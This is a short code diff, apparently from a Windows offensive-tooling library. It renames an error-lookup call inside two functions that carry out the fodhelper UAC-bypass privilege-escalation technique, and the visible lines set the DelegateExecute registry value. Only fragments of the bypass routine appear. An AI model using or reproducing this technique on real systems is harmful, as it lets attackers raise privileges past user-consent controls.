@@ -40,7 +40,7 @@ BOOL UacBypassFodHelperMethodW(PWCHAR PathToBinaryToExecute, PPROCESS_INFORMATIO
 
 	if (!RegGetValueW(hkResult, NULL, L"DelegateExecute", RRF_RT_REG_SZ, NULL, pvData, &dwError))
 	{
-		if (GetLastErrorEx() == ERROR_FILE_NOT_FOUND)
+		if (GetLastErrorFromTeb() == ERROR_FILE_NOT_FOUND)
 		{
 			if (!RegSetKeyValueW(hkResult, NULL, L"DelegateExecute", REG_SZ, NULL, 0))
 				goto EXIT_ROUTINE;
@@ -64,7 +64,7 @@ BOOL UacBypassFodHelperMethodW(PWCHAR PathToBinaryToExecute, PPROCESS_INFORMATIO
 EXIT_ROUTINE:
 
 	if(!bFlag)
-		dwError = GetLastErrorEx();
+		dwError = GetLastErrorFromTeb();
 
 	if (hkResult)
 		RegCloseKey(hkResult);
@@ -94,7 +94,7 @@ BOOL UacBypassFodHelperMethodA(PCHAR PathToBinaryToExecute, PPROCESS_INFORMATION
 
 	if (!RegGetValueA(hkResult, NULL, "DelegateExecute", RRF_RT_REG_SZ, NULL, pvData, &dwError))
 	{
-		if (GetLastErrorEx() == ERROR_FILE_NOT_FOUND)
+		if (GetLastErrorFromTeb() == ERROR_FILE_NOT_FOUND)
 		{
 			if (!RegSetKeyValueA(hkResult, NULL, "DelegateExecute", REG_SZ, NULL, 0))
 				goto EXIT_ROUTINE;
@@ -118,7 +118,7 @@ BOOL UacBypassFodHelperMethodA(PCHAR PathToBinaryToExecute, PPROCESS_INFORMATION
 EXIT_ROUTINE:
 
 	if (!bFlag)
-		dwError = GetLastErrorEx();
+		dwError = GetLastErrorFromTeb();
 
 	if (hkResult)
 		RegCloseKey(hkResult);
